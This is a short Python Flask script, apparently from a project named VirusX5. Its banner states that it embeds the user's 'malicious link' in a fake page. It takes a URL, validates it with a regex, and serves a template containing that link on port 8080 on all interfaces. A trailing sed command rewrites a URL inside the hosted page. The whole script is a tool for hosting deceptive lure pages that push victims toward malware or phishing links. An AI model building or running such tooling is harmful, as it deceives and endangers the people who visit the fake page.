#!/bin/python3
#Auto hosting Script
import os
import re
import sys
import time
from flask import Flask, render_template
from lib.asciiart import banner, check_platform


app = Flask(__name__)

URL_REGEX = 'http[s]?:\/\/([a-z0-9]*[\.]?[a-z0-9_]+\.[\w]+)[\/]?.*'

supported_platform = check_platform()

#colours
if supported_platform:                 
    red = '\033[1;31m'
    pur='\033[35m'
    cyan='\033[1;36m'
    grn='\033[1;92m'
    end='\033[0m'
    br = '\033[1;77m'
else:                       #Disabled colors for Windows
    red = pur = cyan = grn = br = end = ''

#Credits

print(f"{grn}               WELCOME HERE YOU CAN AUTO EMBED YOUR MALICIOUS LINK IN FAKE PAGE {end}")
time.sleep(1)
print(banner)
print(f'''{grn}                                {red}+{end}{grn}-----------------------{end}{red}+{end}
                                {grn}|Author| Zaeem Technical|{end}
                                {red}+{end}{grn}-----------------------{end}{red}+{end}
                                {grn}|Github| Zaeem20        |{end}
                                {red}+{end}{grn}-----------------------{end}{red}+{end}''')

print()
print()
time.sleep(2)

print(f"{grn}Enter Your Destination Link:-  {end}")
link =  input(f'\n{grn}[{end}{br}*{end}{grn}] Enter Whole URL including [HTTP/HTTPS]: {end}')

while True:
    try:
        valid_link = re.search(URL_REGEX, link)
        if valid_link:
            os.system('clear' if check_platform() else 'cls')   # one-liner if else 😎
            @app.route('/')
            def index():
                return render_template("index.html", url=link)
            break
        else:
            link = input(f"{grn}[{end}{br}+{end}{grn}]{end}{red} Please re-enter url, it looks incorrect: {end}")
    except KeyboardInterrupt:
        print(f'\n{grn}[{end}{cyan}{br}?{end}{end}{grn}]{end}{red} Stopped, Exiting: 1{end}')
        sys.exit(1)
        

if __name__ == '__main__':
    time.sleep(3)
    app.run("0.0.0.0", port=8080)




""" cd $HOME/VirusX5/host/

sed -i s/http://www.zaeemtechnical.ml/$var/  $HOME/VirusX5/host/index.html """
